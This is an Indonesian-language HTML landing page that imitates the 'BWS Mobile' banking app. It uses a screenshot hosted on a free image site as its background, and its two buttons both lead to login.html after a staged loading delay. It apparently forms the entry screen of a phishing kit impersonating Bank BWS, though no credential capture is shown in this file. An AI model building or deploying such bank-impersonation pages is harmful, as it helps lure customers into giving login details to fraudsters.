<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home | BWS Mobile</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            min-height: 100vh;
            background: url('https://i.ibb.co.com/NLBVdzT/Screenshot-20241212-125811.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-y: hidden;
        }

        .btn-primary {
            display: block;
            width: 100%;
            padding: 19px;
            margin-bottom: 25px;
            background-color: #2196F3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-top: 390px;
        }

        .btn-primary:hover {
            background-color: #1976D2;
        }

        .btn-secondary {
            display: inline-block;
            padding: 8px 16px;
            color: #3D4043;
            text-decoration: underline;
            font-size: 12px;
            background: none;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: bold;
        }

        /* Loading Styles */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none; /* Hidden by default */
        }

        .loading-content {
            background: white;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            max-width: 300px;
        }

        .loading-content p {
            margin: 0;
            font-size: 10px;
            color: #333;
            margin-bottom: 10px;
            font-weight: 400;
        }

        .text-muted {
            font-size: 12px;
            color: #666;
        }

        .dots {
            display: flex;
            justify-content: center;
            margin-top: 10px;
        }

        .dot {
            width: 8px;
            height: 8px;
            margin: 0 4px;
            background-color: #2196F3;
            border-radius: 50%;
            animation: bounce 1.2s infinite ease-in-out;
        }

        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes bounce {
            0%, 80%, 100% {
                transform: scale(0);
            }
            40% {
                transform: scale(1);
            }
        }
    </style>
</head>
<body>
    <div class="content-wrapper">
        <div class="container">
            <button class="btn-primary" onclick="navigateToPage('login.html')">
                Saya belum memiliki akun BWS Mobile
            </button>
            <button class="btn-secondary" onclick="navigateToPage('login.html')">
                Saya sudah memiliki akun BWS Mobile
            </button>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <p>Mohon Tunggu</p>
            <p class="text-muted">Kami sedang memuat data</p>
            <div class="dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <p class="text-muted">Jaga rahasia data Anda, jangan pernah bagikan data Anda kepada siapapun termasuk pihak Bank BWS</p>
        </div>
    </div>

    <script>
        // Fungsi untuk menampilkan loading dan kemudian pindah halaman
        function navigateToPage(pageUrl) {
            const loadingOverlay = document.getElementById('loadingOverlay');
            loadingOverlay.style.display = 'flex';

            // Simulasi proses loading
            setTimeout(() => {
                window.location.href = pageUrl; // Navigasi ke halaman berikutnya
            }, 3000); // Sesuaikan durasi loading jika diperlukan
        }
    </script>
</body>
</html>
